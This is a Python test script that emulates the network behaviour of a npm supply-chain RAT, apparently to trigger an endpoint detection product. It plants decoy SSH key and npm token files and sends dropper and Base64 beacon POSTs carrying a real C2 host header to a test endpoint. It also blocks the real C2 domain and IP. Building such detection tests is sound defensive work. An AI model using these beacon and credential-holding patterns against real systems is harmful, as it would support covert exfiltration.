#!/usr/bin/env python3
"""
Trigger npm supply chain RAT beacon detection.

Real threat: axios 1.14.1 / 0.30.4 npm compromise (31 March 2026) --
a compromised maintainer account published malicious versions that
introduced a phantom dependency (plain-crypto-js 4.2.1) whose
postinstall hook downloaded a platform-specific RAT via HTTP POST to
a C2 server on TCP/8000.  The RAT beacons every ~60 seconds with
Base64-encoded JSON metadata using a hardcoded legacy IE User-Agent.

This script simulates both network phases:
  Phase 1 (dropper): single HTTP POST with platform-discriminator body
  Phase 2 (beacon):  periodic HTTP POST with Base64(JSON) system info,
                     legacy IE User-Agent, while holding credential files

The same Python process owns both the network flow and the file handles
so that flodbadd's L7 attribution ties them together.

Detection path:
  flodbadd iForest  ->  session marked "anomalous" (periodic beacon pattern)
  L7 open_files contains sensitive path  ->  token_exfiltration finding
  divergence engine  ->  undeclared destination not in behavioral model

IOCs (defanged): sfrclak[.]com / 142.11.206.73 -- BLOCKED by this script.

Reference: StepSecurity incident report (31 Mar 2026)

Cross-platform: macOS, Linux, Windows.
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import platform
import signal
import socket
import sys
import time
from pathlib import Path
from urllib.parse import urlparse

from _common import resolve_agent_type, state_dir_for, file_prefix_for, upper_prefix_for

PID_FILE = "npm_rat_beacon.pid"
CREATED_MARKER = "npm_rat_beacon.created"

DEFAULT_TARGET_HOST = "portquiz.net"
DEFAULT_TARGET_PORT = 63173

BLOCKED_HOSTS = {
    "sfrclak.com",
    "142.11.206.73",
}

DEFAULT_UA = "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)"

PLATFORM_DISCRIMINATORS = {
    "Darwin": "product0",
    "Windows": "product1",
    "Linux": "product2",
}

KEEP_RUNNING = True


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Trigger npm supply chain RAT beacon detection by sending "
                    "periodic Base64-encoded HTTP POST beacons with a legacy IE "
                    "User-Agent while holding credential files open "
                    "(axios 1.14.1 pattern)."
    )
    p.add_argument("--agent-type", default=None,
                   help="Agent type: openclaw|cursor|claude_code|claude_desktop (default: openclaw or EDAMAME_AGENT_TYPE)")
    p.add_argument("--target-host", default=DEFAULT_TARGET_HOST)
    p.add_argument("--target-ip", default="",
                   help="Pre-resolved IP; skips DNS if set")
    p.add_argument("--target-port", type=int, default=DEFAULT_TARGET_PORT)
    p.add_argument("--interval", type=float, default=10.0,
                   help="Seconds between beacon requests (real RAT uses 60s; default 10s for demo)")
    p.add_argument("--duration", type=float, default=0.0,
                   help="Runtime limit in seconds; 0 = until interrupted")
    p.add_argument("--state-dir", type=Path, default=None)
    return p.parse_args()


def handle_signal(signum: int, _frame: object) -> None:
    global KEEP_RUNNING
    _ = signum
    KEEP_RUNNING = False


def ensure_state_dir(d: Path) -> None:
    d.mkdir(parents=True, exist_ok=True)


def record_created(state_dir: Path, path: Path) -> None:
    marker = state_dir / CREATED_MARKER
    existing = set()
    if marker.exists():
        existing = {l.strip() for l in marker.read_text("utf-8").splitlines() if l.strip()}
    existing.add(str(path))
    marker.write_text("\n".join(sorted(existing)) + "\n", encoding="utf-8")


def ensure_demo_sensitive_file(path: Path, content: str, state_dir: Path) -> Path:
    path = path.expanduser()
    path.parent.mkdir(parents=True, exist_ok=True)
    if path.exists():
        return path
    path.write_text(content, encoding="utf-8")
    try:
        path.chmod(0o600)
    except OSError:
        pass
    record_created(state_dir, path)
    return path


def validate_target(host: str, ip: str) -> None:
    for blocked in BLOCKED_HOSTS:
        if blocked in host or blocked in ip:
            raise SystemExit(f"Refusing to target blocked host: {blocked}")


def resolve_target(target_ip: str, target_host: str) -> str:
    if target_ip.strip():
        return target_ip.strip()
    return socket.gethostbyname(target_host)


def open_sensitive_files(paths: list[Path]) -> list[object]:
    handles = []
    for p in paths:
        if p.exists():
            h = p.open("rb")
            h.read(1)
            h.seek(0)
            handles.append(h)
    return handles


def build_dropper_request() -> bytes:
    """Phase 1: single HTTP POST mimicking the postinstall dropper fetch."""
    discriminator = PLATFORM_DISCRIMINATORS.get(platform.system(), "product2")
    body = discriminator.encode()
    request = (
        f"POST /1337 HTTP/1.1\r\n"
        f"Host: sfrclak.com\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode() + body
    return request


def build_beacon_payload(seq: int) -> str:
    """Build Base64-encoded JSON metadata mimicking the RAT's system fingerprint."""
    payload = {
        "vid": f"test-{os.getpid()}",
        "ts": time.time(),
        "seq": seq,
        "host": {
            "hostname": socket.gethostname(),
            "os": platform.system(),
            "release": platform.release(),
            "arch": platform.machine(),
        },
        "telemetry": {
            "heartbeat": True,
            "note": "TEST_EMULATION_ONLY",
        },
    }
    raw = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    return base64.b64encode(raw).decode("ascii")


def build_beacon_request(seq: int) -> bytes:
    """Phase 2: periodic HTTP POST beacon with Base64 JSON and legacy IE UA."""
    b64_body = build_beacon_payload(seq).encode("ascii")
    request = (
        f"POST /beacon HTTP/1.1\r\n"
        f"Host: sfrclak.com\r\n"
        f"User-Agent: {DEFAULT_UA}\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {len(b64_body)}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode() + b64_body
    return request


def main() -> int:
    args = parse_args()
    agent_type = resolve_agent_type(args.agent_type)
    if args.state_dir is None:
        args.state_dir = state_dir_for(agent_type)
    pfx = file_prefix_for(agent_type)
    upfx = upper_prefix_for(agent_type)
    state_dir = args.state_dir
    ensure_state_dir(state_dir)

    validate_target(args.target_host, args.target_ip)

    ssh_key = ensure_demo_sensitive_file(
        Path(f"~/.ssh/{pfx}_npm_rat_key"),
        f"-----BEGIN OPENSSH PRIVATE KEY-----\n{upfx}_NPM_RAT_BEACON\n-----END OPENSSH PRIVATE KEY-----\n",
        state_dir,
    )
    npmrc = ensure_demo_sensitive_file(
        Path(f"~/.npmrc_{pfx}_rat"),
        f"//registry.npmjs.org/:_authToken=npm_{pfx}_RAT_DEMO_TOKEN\n",
        state_dir,
    )

    open_paths = [ssh_key, npmrc]
    psk_path = Path("~/.edamame_psk").expanduser()
    if psk_path.exists():
        open_paths.append(psk_path)

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    pid_file = state_dir / PID_FILE
    pid_file.write_text(f"{os.getpid()}\n", encoding="utf-8")

    target_ip = resolve_target(args.target_ip, args.target_host)
    handles = open_sensitive_files(open_paths)
    started = time.monotonic()
    duration = max(args.duration, 0.0)
    interval = max(args.interval, 1.0)

    print(f"trigger_npm_rat_beacon.py active  pid={os.getpid()}")
    for p in open_paths:
        print(f"  open_path={p}")
    print(f"  target={target_ip}:{args.target_port} host={args.target_host}")
    print("  threat=axios 1.14.1/0.30.4 npm supply chain RAT (31 March 2026)")
    print("  reference=StepSecurity incident report")
    print("  detection=token_exfiltration + divergence (undeclared C2 beacon)")
    print(f"  mode=Phase1(dropper POST) + Phase2(Base64 JSON beacon every {interval}s)")
    print(f"  user_agent={DEFAULT_UA}")
    print("  stop_with=Ctrl-C or python3 cleanup.py")
    sys.stdout.flush()

    sock: socket.socket | None = None
    beacon_seq = 0
    dropper_sent = False
    try:
        while KEEP_RUNNING:
            if duration > 0 and (time.monotonic() - started) >= duration:
                break

            if sock is None:
                try:
                    sock = socket.create_connection(
                        (target_ip, args.target_port), timeout=10.0
                    )
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                    sock.settimeout(30.0)
                except OSError:
                    time.sleep(min(interval, 1.0))
                    continue

            if not dropper_sent:
                try:
                    sock.sendall(build_dropper_request())
                    dropper_sent = True
                    print(f"  phase1_dropper sent discriminator={PLATFORM_DISCRIMINATORS.get(platform.system(), 'product2')}")
                    sys.stdout.flush()
                except OSError:
                    try:
                        sock.close()
                    except OSError:
                        pass
                    sock = None
                    time.sleep(min(interval, 0.5))
                    continue
                time.sleep(2.0)

            beacon_seq += 1
            try:
                sock.sendall(build_beacon_request(beacon_seq))
            except OSError:
                try:
                    sock.close()
                except OSError:
                    pass
                sock = None
                dropper_sent = False
                time.sleep(min(interval, 0.5))
                continue

            # Drain any echoed data
            try:
                sock.setblocking(False)
                try:
                    sock.recv(65536)
                except (BlockingIOError, OSError):
                    pass
                finally:
                    sock.setblocking(True)
                    sock.settimeout(30.0)
            except OSError:
                pass

            time.sleep(interval)
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
        for h in handles:
            try:
                h.close()
            except OSError:
                pass
        try:
            pid_file.unlink()
        except FileNotFoundError:
            pass

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
